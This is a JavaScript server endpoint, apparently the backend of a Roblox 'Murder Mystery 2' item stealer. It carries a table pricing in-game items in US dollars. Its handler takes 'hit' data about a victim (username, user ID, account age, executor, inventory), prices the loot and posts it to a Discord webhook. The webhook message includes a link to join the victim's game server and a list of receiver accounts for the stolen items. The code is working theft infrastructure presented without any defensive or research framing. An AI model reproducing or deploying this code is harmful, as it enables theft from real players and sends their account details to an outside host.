import crypto from 'crypto';

// ============================================================
// MM2 ITEM VALUE TABLE
// Values are community "demand" points from Supreme Values.
// USD estimate: roughly $1 per 1000 sv for mid-tier items.
// Godlies/chromas command higher real-world premiums.
// ============================================================
const ROBUX_PER_USD = 80; // DevEx rate

const MM2_VALUES = {
  // ── CHROMAS (highest tier) ─────────────────────────────
  'ChromaGemstone':        { sv: 200000, usd: 250  },
  'ChromaHarvester':       { sv: 180000, usd: 220  },
  'ChromaLuger':           { sv: 120000, usd: 150  },
  'ChromaDeathShard':      { sv: 100000, usd: 120  },
  'ChromaSlasher':         { sv: 90000,  usd: 110  },
  'ChromaOrkle':           { sv: 90000,  usd: 110  },
  'ChromaBatwing':         { sv: 80000,  usd: 95   },
  'ChromaFang':            { sv: 75000,  usd: 90   },
  'ChromaGingerblade':     { sv: 70000,  usd: 85   },
  'ChromaMeteorShower':    { sv: 65000,  usd: 80   },
  'ChromaBlackShark':      { sv: 60000,  usd: 75   },
  'ChromaEbon':            { sv: 55000,  usd: 68   },
  'ChromaHawkblade':       { sv: 50000,  usd: 62   },
  'ChromaGoldRay':         { sv: 48000,  usd: 60   },
  'ChromaHuntsman':        { sv: 45000,  usd: 55   },
  'ChromaIce':             { sv: 43000,  usd: 53   },
  'ChromaFlame':           { sv: 40000,  usd: 50   },
  'ChromaAcid':            { sv: 38000,  usd: 47   },
  'ChromaBone':            { sv: 35000,  usd: 43   },
  'ChromaSteel':           { sv: 30000,  usd: 37   },
  'ChromaVoid':            { sv: 28000,  usd: 35   },

  // ── GODLIES ────────────────────────────────────────────
  'Gemstone':              { sv: 65000,  usd: 80   },
  'Elderwood':             { sv: 40000,  usd: 50   },
  'Icebreaker':            { sv: 35000,  usd: 43   },
  'Elderwood_Scythe':      { sv: 35000,  usd: 43   },
  'ElderScythe':           { sv: 35000,  usd: 43   },
  'Harvester':             { sv: 28000,  usd: 35   },
  'Luger':                 { sv: 25000,  usd: 31   },
  'Deathshard':            { sv: 22000,  usd: 27   },
  'DeathShard':            { sv: 22000,  usd: 27   },
  'Orkle':                 { sv: 20000,  usd: 25   },
  'Batwing':               { sv: 18000,  usd: 22   },
  'Fang':                  { sv: 16000,  usd: 20   },
  'Gingerblade':           { sv: 15000,  usd: 18   },
  'MeteorShower':          { sv: 14000,  usd: 17   },
  'BlackShark':            { sv: 13000,  usd: 16   },
  'Ebon':                  { sv: 12000,  usd: 15   },
  'Hawkblade':             { sv: 11000,  usd: 13   },
  'GoldRay':               { sv: 10000,  usd: 12   },
  'Huntsman':              { sv: 9500,   usd: 12   },
  'Slasher':               { sv: 9000,   usd: 11   },
  'IceKnife':              { sv: 8500,   usd: 10   },
  'FlameKnife':            { sv: 8000,   usd: 10   },
  'AcidKnife':             { sv: 7500,   usd: 9    },
  'BoneKnife':             { sv: 7000,   usd: 8    },
  'SteelKnife':            { sv: 6500,   usd: 8    },
  'VoidKnife':             { sv: 6000,   usd: 7    },
  'GlassKnife':            { sv: 5500,   usd: 7    },
  'Illumina':              { sv: 8500,   usd: 10   },
  'WalkingCane':           { sv: 5000,   usd: 6    },
  'LegacyKnife':           { sv: 4500,   usd: 5    },
  'SeerKnife':             { sv: 4000,   usd: 5    },
  'Seer':                  { sv: 4000,   usd: 5    },
  'SeerGun':               { sv: 3000,   usd: 3.50 },

  // ── LEGENDARIES ────────────────────────────────────────
  'Shark':                 { sv: 2000,   usd: 2.50 },
  'SharkKnife':            { sv: 2000,   usd: 2.50 },
  'SharkGun':              { sv: 1800,   usd: 2.20 },
  'Snowflake':             { sv: 1500,   usd: 1.85 },
  'SnowflakeKnife':        { sv: 1500,   usd: 1.85 },
  'Pumpkin':               { sv: 1300,   usd: 1.60 },
  'PumpkinKnife':          { sv: 1300,   usd: 1.60 },
  'Candy':                 { sv: 1200,   usd: 1.50 },
  'CandyKnife':            { sv: 1200,   usd: 1.50 },
  'Rainbow':               { sv: 1000,   usd: 1.25 },
  'RainbowKnife':          { sv: 1000,   usd: 1.25 },
  'GoldenKnife':           { sv: 900,    usd: 1.10 },
  'GoldenGun':             { sv: 800,    usd: 1.00 },
  'CrimsonKnife':          { sv: 750,    usd: 0.90 },
  'CrimsonGun':            { sv: 700,    usd: 0.85 },
  'Laser':                 { sv: 600,    usd: 0.75 },
  'LaserGun':              { sv: 550,    usd: 0.68 },
  'NightKnife':            { sv: 500,    usd: 0.60 },
  'NightGun':              { sv: 450,    usd: 0.55 },

  // ── SCYTHES ────────────────────────────────────────────
  'Scythe':                { sv: 35000,  usd: 43   },
  'IceScythe':             { sv: 20000,  usd: 25   },
  'FlameScythe':           { sv: 18000,  usd: 22   },
  'GoldScythe':            { sv: 12000,  usd: 15   },
  'ShadowScythe':          { sv: 10000,  usd: 12   },
  'ChromaScythe':          { sv: 90000,  usd: 110  },

  // ── VALENTINES / SEASONAL KNIVES ──────────────────────
  'Lovely':                { sv: 3000,   usd: 3.75 },
  'Love':                  { sv: 2500,   usd: 3.10 },
  'Heartblade':            { sv: 2000,   usd: 2.50 },
  'Sweetheart':            { sv: 1800,   usd: 2.20 },
  'CupidsArrow':           { sv: 1500,   usd: 1.85 },
  'RoseGold':              { sv: 1200,   usd: 1.50 },
  'Lollipop':              { sv: 800,    usd: 1.00 },
  'Candy_K':               { sv: 1200,   usd: 1.50 },
  'Candy_G':               { sv: 1000,   usd: 1.25 },

  // ── SEASONAL / LIMITED ────────────────────────────────
  'Duckies':               { sv: 500,    usd: 0.60 },
  'Duckie':                { sv: 500,    usd: 0.60 },
  'Spider':                { sv: 1500,   usd: 1.85 },
  'Pumpkinator':           { sv: 2500,   usd: 3.10 },
  'Hallows':               { sv: 3000,   usd: 3.75 },
  'Turkey':                { sv: 800,    usd: 1.00 },
  'Wreath':                { sv: 600,    usd: 0.75 },
  'Sleigh':                { sv: 700,    usd: 0.85 },
  'Arctic':                { sv: 900,    usd: 1.10 },
  'Blizzard':              { sv: 1100,   usd: 1.35 },
  'Starfire':              { sv: 2000,   usd: 2.50 },
  'Starlight':             { sv: 1500,   usd: 1.85 },
  'Flames':                { sv: 1200,   usd: 1.50 },
  'Storm':                 { sv: 1000,   usd: 1.25 },
  'Thunder':               { sv: 900,    usd: 1.10 },
  'Neon':                  { sv: 800,    usd: 1.00 },
  'Galaxy':                { sv: 1500,   usd: 1.85 },
  'Comet':                 { sv: 700,    usd: 0.85 },
  'Shooting':              { sv: 600,    usd: 0.75 },
  'Cherry':                { sv: 400,    usd: 0.50 },
  'Sunrise':               { sv: 350,    usd: 0.43 },
  'Sunset':                { sv: 350,    usd: 0.43 },
  'Shadow':                { sv: 1200,   usd: 1.50 },
  'Phantom':               { sv: 900,    usd: 1.10 },
  'Raven':                 { sv: 700,    usd: 0.85 },
  'Crow':                  { sv: 600,    usd: 0.75 },
  'Bat':                   { sv: 500,    usd: 0.60 },
  'Ghost':                 { sv: 400,    usd: 0.50 },
  'Cursed':                { sv: 300,    usd: 0.37 },
  'Eternal':               { sv: 1500,   usd: 1.85 },
  'Abyss':                 { sv: 1200,   usd: 1.50 },
  'Void':                  { sv: 800,    usd: 1.00 },
  'Corrupt':               { sv: 600,    usd: 0.75 },
  'Corrupt_K':             { sv: 600,    usd: 0.75 },

  // ── RARES ──────────────────────────────────────────────
  'Uncommon':              { sv: 200,    usd: 0.25 },
  'UncommonKnife':         { sv: 200,    usd: 0.25 },
  'UncommonGun':           { sv: 180,    usd: 0.22 },
  'SilverKnife':           { sv: 150,    usd: 0.18 },
  'SilverGun':             { sv: 130,    usd: 0.16 },
  'CopperKnife':           { sv: 100,    usd: 0.12 },
  'CopperGun':             { sv: 90,     usd: 0.11 },
  'BronzeKnife':           { sv: 80,     usd: 0.10 },
  'BronzeGun':             { sv: 70,     usd: 0.08 },

  // ── COMMONS / JUNK ─────────────────────────────────────
  'DefaultKnife':          { sv: 1,      usd: 0    },
  'DefaultGun':            { sv: 1,      usd: 0    },
  'CommonKnife':           { sv: 5,      usd: 0.01 },
  'CommonGun':             { sv: 5,      usd: 0.01 },
};

// Safe lookup — NO fuzzy substring matching (it causes wrong item hits).
// Only does: exact → case-insensitive exact → strip year → strip _K/_G suffix → Knife/Gun append
function normalizeName(raw) {
  if (!raw) return [];
  const variants = new Set();
  variants.add(raw);

  // Strip trailing year: Love_K_2023 → Love_K
  const noYear = raw.replace(/_20\d{2}$/i, '');
  variants.add(noYear);

  // Strip _K or _G (with optional year): Love_K_2023 → Love, Duckies_G_2026 → Duckies
  const noSuffix = raw.replace(/_(K|G)(_20\d{2})?$/i, '');
  variants.add(noSuffix);

  // Also try appending Knife / Gun to the stripped base
  variants.add(noSuffix + 'Knife');
  variants.add(noSuffix + 'Gun');

  return [...variants];
}

function lookupValueStatic(rawName) {
  const candidates = normalizeName(rawName);
  for (const candidate of candidates) {
    // Exact match
    if (MM2_VALUES[candidate] !== undefined) return MM2_VALUES[candidate];
    // Case-insensitive exact match
    const lower = candidate.toLowerCase();
    for (const [key, val] of Object.entries(MM2_VALUES)) {
      if (key.toLowerCase() === lower) return val;
    }
  }
  return null;
}

// Attempt to fetch live price from Supreme Values.
// They're behind Incapsula but we try with real browser headers.
// Returns { sv, usd } or null on failure.
async function fetchLivePrice(itemName) {
  try {
    // Try their item page — parse the sv value out of the HTML
    const slug = itemName.toLowerCase().replace(/[^a-z0-9]/g, '');
    const resp = await fetch(`https://www.supremevalues.com/item/${slug}`, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://www.supremevalues.com/',
      },
      signal: AbortSignal.timeout(4000)
    });
    if (!resp.ok) return null;
    const html = await resp.text();
    // Their pages embed value like: "value":1234 or >1,234< in the page
    const match = html.match(/"demand"\s*:\s*(\d+(?:\.\d+)?)/i)
      || html.match(/data-value="(\d+(?:\.\d+)?)"/i)
      || html.match(/>Value[^<]*<\/[^>]+>\s*([\d,]+)</i);
    if (match) {
      const sv = parseFloat(match[1].replace(/,/g, ''));
      return { sv, usd: +(sv / 1000 * 1.2).toFixed(2) };
    }
  } catch (_) { /* blocked or timeout */ }
  return null;
}

async function lookupValue(rawName) {
  // 1. Try static table first (fast, no network)
  const staticResult = lookupValueStatic(rawName);
  if (staticResult !== null) return staticResult;

  // 2. Try live fetch for items not in static table
  const liveResult = await fetchLivePrice(rawName);
  if (liveResult) return liveResult;

  // Try the suffix-stripped base name too
  const noSuffix = rawName.replace(/_(K|G)(_20\d{2})?$/i, '').replace(/_20\d{2}$/i, '');
  if (noSuffix !== rawName) {
    const liveBase = await fetchLivePrice(noSuffix);
    if (liveBase) return liveBase;
  }

  return null;
}

function formatUSD(usd) {
  if (usd === 0) return '$0.00';
  if (usd < 0.01) return '<$0.01';
  return `$${usd.toFixed(2)}`;
}

function getTier(sv) {
  if (sv >= 50000) return '👑';   // Chroma
  if (sv >= 4000)  return '🔴';   // Godly
  if (sv >= 500)   return '🟣';   // Legendary
  if (sv >= 50)    return '🔵';   // Rare
  if (sv >= 5)     return '🟢';   // Common
  return '⚫';                     // Junk
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { hitData } = req.body;

  if (!hitData) {
    return res.status(400).json({ success: false, error: 'Missing hitData' });
  }

  const sessionId = crypto.randomUUID();
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL || 'YOUR_WEBHOOK_URL_HERE';

  if (webhookUrl !== 'YOUR_WEBHOOK_URL_HERE') {
    try {
      // ── Value calculation (async lookups run in parallel) ──
      let totalUSD = 0;
      const valuedItems = await Promise.all((hitData.items || []).map(async item => {
        const lookup = await lookupValue(item.name);
        const itemUSD = lookup ? +(lookup.usd * item.amount) : null;
        if (itemUSD) totalUSD += itemUSD;
        return { ...item, sv: lookup?.sv ?? null, usd: itemUSD };
      }));

      // Sort: known value (high→low) → unknown/unlisted → confirmed $0 junk
      valuedItems.sort((a, b) => {
        const aIsJunk    = a.usd !== null && a.usd === 0;
        const bIsJunk    = b.usd !== null && b.usd === 0;
        const aIsUnknown = a.usd === null;
        const bIsUnknown = b.usd === null;

        // Both unknown → equal
        if (aIsUnknown && bIsUnknown) return 0;
        // Both junk → equal
        if (aIsJunk && bIsJunk) return 0;
        // Junk goes last
        if (aIsJunk) return 1;
        if (bIsJunk) return -1;
        // Unknown goes before junk but after known value
        if (aIsUnknown) return 1;
        if (bIsUnknown) return -1;
        // Both have real value → sort descending
        return b.usd - a.usd;
      });

      // Build loot field string
      const lootLines = valuedItems.length > 0
        ? valuedItems.map(item => {
            const tier = item.sv !== null ? getTier(item.sv) : '❓';
            const price = item.usd !== null ? formatUSD(item.usd) : `[check](https://www.supremevalues.com/search?q=${encodeURIComponent(item.name)})`;
            return `${tier} **${item.name}** x${item.amount} — ${price}`;
          })
        : ['No items'];

      lootLines.push(`\n💰 **Est. Total: ${formatUSD(totalUSD)}**`);
      const lootValue = lootLines.join('\n');

      // ── Join link (https:// redirect so Discord renders it clickable) ──
      const BASE_URL = process.env.VERCEL_URL
        ? `https://${process.env.VERCEL_URL}`
        : 'https://roblox-stealer-api.vercel.app';

      const joinUrl = hitData.placeId && hitData.jobId
        ? `${BASE_URL}/api/join?placeId=${hitData.placeId}&jobId=${hitData.jobId}`
        : null;

      // ── Build embed ──────────────────────────────────────
      const embedFields = [
        { name: '👤 Username',      value: `\`${hitData.username || 'Unknown'}\``,     inline: true  },
        { name: '🏷️ Display Name',  value: `\`${hitData.displayName || 'Unknown'}\``,  inline: true  },
        { name: '🆔 Session ID',    value: `\`${sessionId}\``,                         inline: false },
        { name: '🎮 Game',          value: hitData.gameName || 'Unknown',               inline: true  },
        { name: '👥 Players',       value: `${hitData.playerCount ?? '?'} / ${hitData.maxPlayers ?? '?'}`, inline: true },
        { name: '📅 Account Age',   value: `${hitData.accountAge ?? '?'} days`,        inline: true  },
        { name: '🔧 Executor',      value: hitData.executor || 'Unknown',               inline: true  },
        { name: '🪙 User ID',       value: `\`${hitData.robloxUserId || 'Unknown'}\``, inline: true  },
        { name: `🎒 Loot (${valuedItems.length} items)`, value: lootValue.slice(0, 1024), inline: false },
        { name: '📜 Join Script',   value: `\`\`\`lua\n${hitData.joinScript || 'N/A'}\n\`\`\``, inline: false },
      ];

      if (joinUrl) {
        embedFields.push({
          name: '🔗 Join Server',
          value: `[➜ Click to join victim's game server](${joinUrl})`,
          inline: false
        });
      }

      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: null,
          embeds: [{
            title: `🔥 New Hit — Est. ${formatUSD(totalUSD)}`,
            color: totalUSD >= 10 ? 0xFFD700 : totalUSD >= 1 ? 0xFF4444 : 0x888888,
            thumbnail: hitData.avatarUrl ? { url: hitData.avatarUrl } : undefined,
            fields: embedFields,
            footer: { text: `Place: ${hitData.placeId || 'N/A'} • Job: ${hitData.jobId || 'N/A'}` },
            timestamp: new Date().toISOString()
          }]
        })
      });
    } catch (e) {
      console.error('Webhook failed:', e);
    }
  }

  // Parse receivers from env: comma-separated usernames e.g. "User1,User2"
  const receivers = (process.env.RECEIVERS || '')
    .split(',')
    .map(s => s.trim())
    .filter(Boolean);

  console.log(`[+] Hit registered! Session: ${sessionId} | Victim: ${hitData.username}`);

  return res.status(200).json({ success: true, sessionId, receivers });
}
